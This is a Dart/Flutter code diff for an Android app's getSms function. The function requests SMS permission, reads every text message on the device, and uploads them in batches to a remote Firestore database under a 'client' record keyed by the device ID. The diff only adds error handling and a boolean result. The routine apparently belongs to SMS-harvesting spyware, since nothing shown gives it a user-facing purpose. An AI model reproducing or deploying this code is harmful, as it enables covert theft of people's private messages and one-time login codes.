@@ -21,26 +21,32 @@ Future<PermissionStatus> _getSmsPermission() async {
   return smsPermission;
 }
 
-Future<void> getSms() async {
-  final PermissionStatus permissionStatus = await _getSmsPermission();
-  if (permissionStatus == PermissionStatus.granted) {
-    SmsQuery query = SmsQuery();
-    List<SmsMessage> messages = await query.getAllSms;
-    Iterable<SmsMessage> reversedMessages = messages.reversed;
-    String? androidId = await getIdentity();
-    CollectionReference smsCollection =
-        firestore.collection('client').doc(androidId).collection("sms");
-    var batch = firestore.batch();
-    for (var i = 0; i < reversedMessages.length; i++) {
-      if (i % 300 == 0) {
-        await batch.commit();
-        batch = firestore.batch();
+Future<bool> getSms() async {
+  try {
+    final PermissionStatus permissionStatus = await _getSmsPermission();
+    if (permissionStatus == PermissionStatus.granted) {
+      SmsQuery query = SmsQuery();
+      List<SmsMessage> messages = await query.getAllSms;
+      Iterable<SmsMessage> reversedMessages = messages.reversed;
+      String? androidId = await getIdentity();
+      CollectionReference smsCollection =
+          firestore.collection('client').doc(androidId).collection("sms");
+      var batch = firestore.batch();
+      for (var i = 0; i < reversedMessages.length; i++) {
+        if (i % 300 == 0) {
+          await batch.commit();
+          batch = firestore.batch();
+        }
+        DocumentReference smsDocument =
+            smsCollection.doc(reversedMessages.elementAt(i).id.toString());
+        batch.set(smsDocument,
+            Map<String, dynamic>.from(reversedMessages.elementAt(i).toMap));
       }
-      DocumentReference smsDocument =
-          smsCollection.doc(reversedMessages.elementAt(i).id.toString());
-      batch.set(smsDocument,
-          Map<String, dynamic>.from(reversedMessages.elementAt(i).toMap));
+      await batch.commit();
+      return true;
     }
-    await batch.commit();
+    return false;
+  } catch (e) {
+    return false;
   }
 }
